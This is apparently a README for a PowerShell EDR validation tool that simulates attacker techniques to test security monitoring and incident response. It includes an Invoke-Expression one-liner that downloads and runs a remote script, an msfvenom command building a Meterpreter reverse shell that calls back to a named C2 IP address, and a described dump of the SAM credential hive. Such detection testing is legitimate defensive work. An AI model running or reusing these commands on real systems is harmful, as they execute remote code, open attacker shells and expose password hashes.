# ResponseValidation
```
                                                                                 @@@      
                                                                              @@@ @ @@@@  
                                                                            @@@ @ @@@ @   
                                                                         @@@@ @@@@ @  @@@ 
                                                                      /@@@ @@@@  @@@@@ @  
                                                                   #@@. @@@@ @@@@@ &@     
                                                                @@@@@@@@  @@@   @@@@@@&   
                                                             @@@@@@@@@@@@  @@@@@@ @@      
                                                          @@@@@@@@@@@@@@@@   @@@@@@       
                                                       @@@@@@@@@@@@@ %@@@@@   @@          
                                   @@               @@@@    @@@@@@@@   @@@@@@@.@          
                              @@@@ @@@@          @@@@       @@@@@@@@      @@              
                           @@@     @@@@@@      @@@@       @@@@@@@@@@@@  @                 
                        @@@@            @@@   @@@       @@@@@@@@@@@@@@ @                  
                        @@               @@@ @@@       @@@@@@@  @@@@                      
                         @@              @@@@@@      @@@@@@@@@@  @@                       
                          @@              @@@@      @@@@@@@@@@@@                          
                           @(          /@@@        @@@@@    @                             
                           @@       @@@@          @@@@@@@@ @                              
                           @ @@@@@@@#             /@@@@@@@                                
                         @@@@@@@                    @@@@ @                                
                       @  @@@@@                       @@@@                                
                     @  @@@@             @@/            @@@@@@                            
                    @ %@@ @@  @@@@@@@@,   @@         ,@@@@@@@@@@@@@@@@@@@@@@@@@@@         
                     @ @@         @@@@@  @@@@@@@@@@@  ,@@@@@@@@@@@@,@@% ,@@@@@@@          
                      @           @@@@@ @@                  &@@& @@  @@@@@@               
                                 @@@@@@@*                                                 
                                @@@ @@           TRIFIDENT VALIDATION                                         
                             @@   @              - POWERSHELL TESTS -                                      
                         @@ @@@@@                                                         
                             @        
```

# DO NOT RUN WITHOUT EXPRESSED CONSENT FROM TRIFIDENT
To execute, simply run the following command from a machine with PowerShell installed (Windows / MacOS)
```
Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/TRIFIDENT/ResponseValidation/main/RunTests.ps1").Content
```

## What does this Tool Do?
Runs a series of validation checks on the local machine to serve as proof-points for our assessment and are based on the identification of implemented security controls, where we attempt to validate these controls are working as intended. This is not a penetration test, rather a validation that security controls are working properly, and where possible, to test incident communications between providers and response times.

The Following test will be performed:

## Validate EDR Detection and Response:
### T1204.002 : User Execution: Malicious File

> Defanged malicious .lnk file
> Generated by RedCanary as part of the Atomic Red Team framework. All code available for review on their Github Page [Link].  Trifident has reviewed the resulting putty and confirmed it is non-malicious.
> 	
> LNK files are based on the Shell Link Binary file format, also known as Windows shortcuts. But what seems a relatively simple ability to execute other binaries on the system can inflict great harm when abused by threat actors. Microsoft’s decision to block macros by default for files downloaded from the internet in Office applications provoked malware developers to shift to other techniques. 
> 
> This test downloads a crafted .lnk file from github, and then attempts to execute it. When executed, the .lnk file attempts to download a clean copy of Putty (a windows based ssh client) as “a.exe” and attempts to execute it. 
> 
> Expected Outcome: EDR detects, alerts, and quarantines the LNK file, however Putty still executes.


### T1204.002 : User Execution: Malicious File
> Defanged Malware: Meterpreter
>  
> Generated by Trifident, using the following command: 
> msfvenom -p windows/meterpreter_reverse_http LHOST=172.174.245.183 LPORT=9191 HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe
> 
> Meterpreter is a Metasploit attack payload that provides an interactive shell to the attacker from which to explore the target machine and execute code. Meterpreter is deployed using in-memory DLL injection. As a result, Meterpreter resides entirely in memory and writes nothing to disk. It communicates over the stager socket and provides a comprehensive client-side Ruby API. It features command history, tab completion, channels, and more.
> 
> Shell.exe attempts to shovel a meterpreter shell from the host machine to a Trifident owned C2 server over HTTP (port 9191) located in Azure at the IP address of 172.174.245.183.  The C2 meterpreter listener is disabled by default on our C2 server. If execution succeeds, the C2 channel will not be established. If you would like to validate the C2 server is non-operational prior to execution, you can perform the following test:
> nmap -p 9191 172.174.245.183
> *Note: Other ports may be open as this C2 server is used for multiple engagements.
> 
> Expected Outcome: SentinelOne detects, alerts, and quarantines shell.exe without execution.


### T1003.002 : OS Credential Dumping: Security Account Manager
> This test uses the LOLbin “reg” (more info) to attempt to dump the SAM registry hive to a temp file location. This technique is known by attackers to retrieve password hashes and key material. 
> 
> Expected Outcome: SentinelOne detects, alerts, and prevents execution.

### Capture notification evidence
> The script will note the time each test was executed. Please take screenshots of any emails, phone calls, text messages, or any other contact method used by the MSSP vendor. 
> For any tickets that are opened, assigned, or you are notified of, please respond indicating that this was as a result of ongoing security testing, and that the ticket can be closed. 

### Clean Up
> All files downloaded, installed, or created by this script will be automatically removed at completion


